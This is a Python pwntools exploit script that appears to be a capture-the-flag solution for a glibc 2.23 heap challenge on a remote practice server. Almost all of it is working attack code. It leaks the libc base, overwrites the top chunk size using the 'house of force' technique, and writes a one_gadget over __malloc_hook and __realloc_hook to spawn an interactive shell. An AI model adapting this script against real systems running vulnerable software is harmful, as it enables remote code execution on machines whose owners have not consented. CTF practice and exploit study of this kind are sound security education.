#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 26796
elfpath = ''
ldpath = ''
libcpath = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc6_2.23-0ubuntu10_amd64.so'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

def command(c):
    ru(b'2:puts\n')
    sl(str(c).encode())

def add(size, content):
    command(1)
    ru(b'size\n')
    sl(str(size).encode())
    ru(b'bin addr ')
    addr = int(r(14).decode(), 16)
    ru(b'content\n')
    s(content)
    return addr
    
# def edit(index, size, content):
#
# def free(index):
#
# def show(index):
    
# start pwning
'''
glibc2.23
house of force
modify topchunk
''' 
mem1 = add(0x200000, b'aaaa')
libc_base = mem1 + 0x200ff0
su(f"libc base: {hex(libc_base)}")
libc = ELF(libcpath)
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']
su(f"calculated malloc_hook addr: {hex(malloc_hook)}")
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
payload = b'a'*0x10 + b'\x00'*8 + b'\xff'*8
mem2 = add(0x10, payload) # overwrite top chunk size
su(f"mem2: {hex(mem2)}")
# 因为同时要改写realloc_hook和malloc_hook，所以要分配chunk到能够修改realloc_hook和malloc_hook的地方。realloc_hook 在 malloc_hook 前8字节。
malloc_size = malloc_hook - (mem2+0x10) - 0x30
su(f"malloc size: {hex(malloc_size)}")
add(malloc_size, b'a')
add(0x10, b'a'*8 + p64(one_gadgets[1] + libc_base) + p64(realloc + 0x10))
ru(b'2:puts\n')
sl(b'1')
ru(b'size\n')
sl(b'16')
shell()


